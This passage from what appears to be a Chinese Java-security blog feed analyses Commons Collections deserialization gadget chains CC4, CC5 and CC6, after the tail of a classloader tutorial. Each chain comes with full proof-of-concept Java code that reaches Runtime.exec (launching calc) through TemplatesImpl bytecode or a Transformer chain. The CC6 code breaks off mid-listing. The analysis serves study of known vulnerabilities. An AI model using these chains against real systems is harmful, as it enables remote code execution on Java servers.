<p>它生成的<code>SpeakTest.class</code>文件放置在<code>D:\\code\\lib</code>目录下。</p>
<p>再编写<code>DiskClassLoader1</code>和<code>DiskClassLoader2</code>，代码和<code>DiskClassLoader</code>基本一致，修改下加载路径和类路径即可。</p>
<p><code>DiskClassLoader1.java</code>的main方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        DiskClassLoader1 diskLoader1 = new DiskClassLoader1(&quot;D:\\code\\lib\\test&quot;);</span><br><span class="line">        Class cls1 = null;</span><br><span class="line">        try &#123;</span><br><span class="line">//加载class文件</span><br><span class="line">            cls1 = diskLoader1.loadClass(&quot;SpeakTest&quot;);</span><br><span class="line">            System.out.println(cls1.getClassLoader().toString());</span><br><span class="line">            if(cls1 != null)&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Object obj = cls1.newInstance();</span><br><span class="line">                    //SpeakTest1 speak = (SpeakTest1) obj;</span><br><span class="line">                    //speak.speak();</span><br><span class="line">                    Method method = cls1.getDeclaredMethod(&quot;speak&quot;,null);</span><br><span class="line">                    //通过反射调用Test类的speak方法</span><br><span class="line">                    method.invoke(obj, null);</span><br><span class="line">                &#125; catch (InstantiationException | IllegalAccessException</span><br><span class="line">                        | NoSuchMethodException</span><br><span class="line">                        | SecurityException |</span><br><span class="line">                        IllegalArgumentException |</span><br><span class="line">                        InvocationTargetException e) &#123;</span><br><span class="line">                    // TODO Auto-generated catch block</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">// TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318154941422-556943868.png" alt="image-20220318154942350"></p>
<p><code>DiskClassLoader2.java</code>的main方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        DiskClassLoader2 diskLoader2 = new DiskClassLoader2(&quot;D:\\code\\lib&quot;);</span><br><span class="line">        System.out.println(&quot;Thread &quot;+Thread.currentThread().getName()+&quot; classloader: &quot;+Thread.currentThread().getContextClassLoader().toString());</span><br><span class="line">        new Thread(new Runnable() &#123;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                System.out.println(&quot;Thread &quot;+Thread.currentThread().getName()+&quot; classloader: &quot;+Thread.currentThread().getContextClassLoader().toString());</span><br><span class="line"></span><br><span class="line">                // TODO Auto-generated method stub</span><br><span class="line">                try &#123;</span><br><span class="line">                    //加载class文件</span><br><span class="line">                    //	Thread.currentThread().setContextClassLoader(diskLoader);</span><br><span class="line">                    //Class c = diskLoader.loadClass(&quot;SpeakTest&quot;);</span><br><span class="line">                    ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                    Class c = cl.loadClass(&quot;SpeakTest&quot;);</span><br><span class="line">                    // Class c = Class.forName(&quot;SpeakTest&quot;);</span><br><span class="line">                    System.out.println(c.getClassLoader().toString());</span><br><span class="line">                    if(c != null)&#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            Object obj = c.newInstance();</span><br><span class="line">                            //SpeakTest1 speak = (SpeakTest1) obj;</span><br><span class="line">                            //speak.speak();</span><br><span class="line">                            Method method = c.getDeclaredMethod(&quot;speak&quot;,null);</span><br><span class="line">                            //通过反射调用Test类的say方法</span><br><span class="line">                            method.invoke(obj, null);</span><br><span class="line">                        &#125; catch (InstantiationException | IllegalAccessException</span><br><span class="line">                                | NoSuchMethodException</span><br><span class="line">                                | SecurityException |</span><br><span class="line">                                IllegalArgumentException |</span><br><span class="line">                                InvocationTargetException e) &#123;</span><br><span class="line">                            // TODO Auto-generated catch block</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    // TODO Auto-generated catch block</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318155040677-1183824107.png" alt="image-20220318155041635"></p>
<p>根据结果我们可以得出：</p>
<ol>
<li><code>DiskClassLoader1</code>成功加载了<code>SpeakTest.class</code>文件。</li>
<li>主线程和子线程的<code>ContextClassLoader</code>是<code>AppClassLoader</code>。</li>
<li><code>AppClassLoader</code>加载不了父线程当中已经加载的<code>SpeakTest.class</code>内容。</li>
</ol>
<p>修改代码，再子线程开头加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Thread.currentThread().setContextClassLoader(diskLoader2);</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318160725005-1706254425.png" alt="image-20220318160726100"></p>
<p>可以看到子线程的<code>ContextClassLoader</code>变成了<code>DiskClassLoader</code>。</p>
<p>修改diskLoader2为diskLoader1，结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318160546550-939767981.png" alt="image-20220318160547669"></p>
<p>可以看到<code>DiskClassLoader2</code>和<code>DiskClassLoader1</code>分别加载了自己路径下的<code>SpeakTest.class</code>文件。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/briblue/article/details/54973413">https://blog.csdn.net/briblue/article/details/54973413</a></p>
<p><a href="http://gityuan.com/2016/01/24/java-classloader/">http://gityuan.com/2016/01/24/java-classloader/</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>类加载器</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections4分析</title>
    <url>/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接</p>
<span id="more"></span>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>根据<code>TransformingComparator</code> 利用链完成调用。</p>
<p>直接给出最终的反序列化 POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析过程就不写了，和之前的链是一样的分析过程，只是触发调用 <code>transformerChain.transform()</code>方法采用的是另外一种方法，即<code>TransformingComparator.compare()</code>。</p>
<p>反序列化时弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604215447007-1005138662.png" alt="image-20220604215445704"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14032604.html">https://www.cnblogs.com/nice0e3/p/14032604.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections5分析</title>
    <url>/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections5%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC5链中<code>ysoserial</code>给出的提示是需要JDK1.8并且<code>SecurityManager</code>需要是关闭的。</p>
<p>关于SecurityManager的介绍可以看下面的文章：</p>
<p><a href="https://www.cnblogs.com/wly1-6/p/10291202.html">https://www.cnblogs.com/wly1-6/p/10291202.html</a></p>
<span id="more"></span>

<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前面和cc1链是差不多的，主要看后半段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure>

<p>上面代码中首先是实例化了一个<code>TiedMapEntry</code>对象，先来看下<code>TiedMapEntry</code>这个类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000444412-133669978.png" alt="image-20220605000443399"></p>
<p>该类的构造方法需要2个参数，在poc中我们传入了一个<code>LazyMap</code>实例化对象和一个Object对象，接着继续往下看，可以发现两个方法，分别是<code>getKey()</code>和<code>getValue()</code>，其中<code>getValue()</code>方法会去调用构造方法赋值的map类的<code>get()</code>方法，那么如果我们把<code>LazyMap</code>对象赋值给<code>map</code>，然后调用<code>get()</code>方法的话，就可以完成cc1链中的<code>LazyMap</code>调用链了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000738543-2004248985.png" alt="image-20220605000737903"></p>
<p>我们继续往下看，找下哪个地方会调用到<code>getValue()</code>方法，这里发现有多处会调用到<code>getValue()</code>方法，重点看<code>toString()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001330346-1258458263.png" alt="image-20220605001329397"></p>
<p>根据前面poc中下面这部分，这里先new了一个<code>BadAttributeValueExpException</code>的对象，然后通过反射将<code>val</code>的值设置为<code>TiedMapEntry</code>实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure>

<p>后面的poc就是将poc对象进行反序列化，那么，我们直接看下<code>BadAttributeValueExpException</code>这个类的代码，它在反序列化的时候做了什么。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001813381-675845214.png" alt="image-20220605001812297"></p>
<p>反序列化时会调用<code>BadAttributeValueExpException#readObject()</code>方法，可以看到会调用<code>get()</code>方法将val的值赋值给<code>valObj</code>，而val的值就是前面通过反射赋值的<code>TiedMapEntry</code>实例化对象，在下面又会调用<code>valObj.toString()</code>方法，接着触发getValue()方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605002410480-138257297.png" alt="image-20220605002409732"></p>
<p>后续就是cc1链的调用过程了。</p>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString</span><br><span class="line">-&gt;LazyMap.get-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Class.getMethod</span><br><span class="line">-&gt;InvokerTransformer.transform-&gt;Method.invoke</span><br><span class="line">-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Runtime.exec</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13890340.html">https://www.cnblogs.com/nice0e3/p/13890340.html</a></p>
<p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections6分析</title>
    <url>/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC6链中和CC5的利用链类似，只是CC6链中使用的是<code>HashSet</code>去触发<code>LazyMap</code>的get方法，而在CC5中使用的是<code>BadAttributeValueExpException</code>。</p>
<span id="more"></span>

<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">Testtransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line">        